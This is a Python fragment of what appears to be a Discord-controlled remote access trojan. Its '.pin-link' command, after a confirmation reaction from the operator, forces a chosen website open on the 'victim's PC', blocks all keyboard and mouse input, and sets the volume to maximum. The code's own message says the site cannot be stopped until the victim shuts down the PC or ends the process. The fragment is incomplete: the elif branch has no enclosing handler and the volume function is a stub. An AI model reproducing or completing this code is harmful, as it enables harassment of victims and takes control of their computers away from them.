import webbrowser
import pyautogui
import time
from pynput import keyboard, mouse
import asyncio
def block_input():
    keyboard_listener = keyboard.Listener(suppress=True)
    mouse_listener = mouse.Listener(suppress=True)
    keyboard_listener.start()
    mouse_listener.start()
def set_volume(volume):
    # Volume control implementation, you can replace this with your desired volume control method
    print(f"Setting volume to {volume}")
def open_browser_with_link(link):
    # Open the browser with the specified link
    webbrowser.open(link)
# on message
elif message.content.startswith('.pin-link'):
    await message.delete()
    link = message.content.split('"')[1]
    confirmation_message = await message.channel.send(f'Are you sure you want to display the following website to the victim\'s PC?\nLink: {link}\nPlease note that the website cannot be stopped until the victim shuts down the PC or ends the process.\nIf you wish to continue, react with: ✅ If not, react with 🔴.')
    # Add reactions
    await confirmation_message.add_reaction('✅')
    await confirmation_message.add_reaction('🔴')
    def check(reaction, user):
        return user == message.author and str(reaction.emoji) in ['✅', '🔴'] and reaction.message.id == confirmation_message.id
    try:
        reaction, _ = await bot.wait_for('reaction_add', timeout=60.0, check=check)
    except asyncio.TimeoutError:
        await message.channel.send('Confirmation timed out.')
    else:
        if str(reaction.emoji) == '✅':
            # Open browser with the link
            open_browser_with_link(link)
            # Block input
            block_input()
            # Set audio volume to 100%
            set_volume(1.0)  # 1.0 corresponds to 100% volume
        else:
            await message.channel.send('Process cancelled.')
# Keep the script running indefinitely
while True:
    time.sleep(0)  # Adjust the sleep duration as needed
